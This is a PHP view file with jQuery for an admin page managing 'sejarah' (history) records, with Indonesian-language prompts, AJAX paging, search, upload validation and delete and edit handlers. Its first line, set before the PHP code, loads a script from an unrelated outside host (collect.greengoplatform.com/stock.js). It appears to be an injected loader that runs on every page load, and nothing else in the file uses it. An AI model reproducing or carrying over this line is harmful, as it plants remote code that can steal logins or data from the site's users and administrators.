<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><?php $data[$this->pages]=$this->sejarah;$data['focus']=$this->deskripsi; $this->load->view($this->generalHeader,$data) ?>
<div id="result-sub"></div>

<?php form($this->sejarah,$baseView);?>
<script>
    var urlLocal    = `${strSejarah}/`;
    var urlRead     = strRead,urlSave=strSave,urlDelete=strDelete,urlEdit=strEdit;
    var pages       = "<?=$data[$this->pages]?>";
    var nama        = attrId(strDeskripsi);
    var modalForm   = attrId(`${strModal}${pages}`);
    var formInput   = attrId(strFormInput);
    var paramForm   = attrId(strParam);
    var anyPage     = attrId(`${strAny}${pages}`);
    var no=1;
    pageActiveName = pages;
    $(document).ready(function() {
        loadData(1);
    })
    function nextLoad(par){
        var lastRow = toInt(attrId(strLastRows).val());
        var totalRow= toInt(attrId(strTotalRows).val());
        if(totalRow>lastRow){
            loadData(toInt(no)+par);
        }
    }
    function prevLoad(par){
        if(no > 1){
            loadData(toInt(no)-par);
        }
    }

    function loadData(page=1,isCache=true){
        no=page;
        var where=page;
        var any = anyPage.val()!==""?"?any="+anyPage.val():"";
        var totalRows = isNumber(attrId(strTotalRows).val());
        var url=base_url+urlLocal+urlRead;
        where+=any;
        if(!isCache) {
            if(totalRows === 0 ){localCache.remove(url+where);}
            else{for(var i=0;i<totalRows;i++){localCache.remove(url+`${i+1}${any}`);}}
        }
        urlActive = urlLocal+urlRead+where;
        ajaxView(urlLocal+urlRead+where,null,function(res){
            attrId("result-sub").html(res);
        });
    }

    function cari(e, val) {
        if (e.keyCode === 13) {
            anyPage.val(val);
            timeOut(function(){loadData(1,true);})
        }
    }
    formInput.validate({
        rules: {
            nama: {required: true,remote: {url: `${strSocmed}/check_column`,type: "post",data: {param: function () {return paramForm.val();}}}},
            link:{required:true,url: true},
            "file_upload[]":{required:true}
        },
        errorPlacement: handleError(),
        submitHandler: function (form) {
            var formData=new FormData(formInput[0]);
            ajaxFile(base_url+urlLocal+urlSave,formData,function (res) {
                if (res.status) {
                    validateSaveHmtl(nama.val(),anyPage.val(),paramForm.val(),function(page,searchName){
                        if(!searchName) anyPage.val("");
                        loadData(`1`,false);
                        delForm(formInput);
                        paramForm.val(strAdd);
                        modalForm.modal(strHide);
                        notif(strSuccess);
                    })
                } else {
                    notif(strFailed);
                }
            })

        }
    });

    function hapus(id) {
        swal({
            title: "Anda yakin akan hapus data ini?",
            text: "Data yang dihapus tidak bisa dikembalikan lagi",
            type: "warning",
            showCancelButton: true,
            confirmButtonColor: "#696cff",
            cancelButtonColor: "#d33",
            confirmButtonText: "Ya !",
            cancelButtonText: "Tidak !",
            closeOnConfirm: false
        }).then(function (isConfirm) {
            if (isConfirm) {
                ajaxData(base_url+urlLocal+urlDelete, { id: id }, function (res) {
                    swal.close();
                    if (res.status) {
                        loadData("1",false);
                        notif("hapus");
                    } else {
                        notif("error");
                    }
                },false);
            }
        });
    }

    function ubah(id) {
        var baseUrl=base_url+urlLocal+urlEdit+"/"+id;
        handleCacheEdit(baseUrl,function(res){
            if (res.status) {
                var data=res.res_data;
                setFocus(strDeskripsi);
                setIdSelect(strId,data[strId]);
                setIdSelect(strDeskripsi,data[strDeskripsi]);
                setIdSelect("waktu",data["tanggal"]);

            } else {
                notif(strFailed);
            }
        });
    }
    modalForm.on(strHideModal, function () {
        delForm(formInput);
        delImage();
    });
</script>